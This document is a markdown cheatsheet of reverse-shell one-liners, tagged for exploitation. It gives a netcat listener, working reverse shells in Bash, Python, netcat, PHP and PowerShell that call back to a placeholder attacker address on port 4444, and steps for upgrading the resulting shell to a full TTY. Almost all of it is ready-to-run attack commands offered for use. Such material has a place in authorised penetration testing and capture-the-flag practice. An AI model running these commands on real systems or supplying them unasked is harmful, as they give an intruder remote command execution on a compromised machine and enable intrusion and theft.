---
tags: [cheatsheet, shells, exploitation]
---

# 🐚 Reverse Shells Cheatsheet

> Always keep these commands handy

**Listener on your machine:**
```bash
nc -lvnp 4444
```

---

## Bash

```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

## Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Netcat

```bash
nc YOUR_IP 4444 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

## PHP

```php
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## PowerShell (Windows)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Stabilise a Linux Shell

```bash
# 1. Get a proper TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background the shell
Ctrl + Z

# 3. On your machine
stty raw -echo; fg

# 4. Inside the shell
export TERM=xterm
reset
```

---

## 🔗 Generators

- [RevShells.com](https://www.revshells.com/) — generate any reverse shell
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
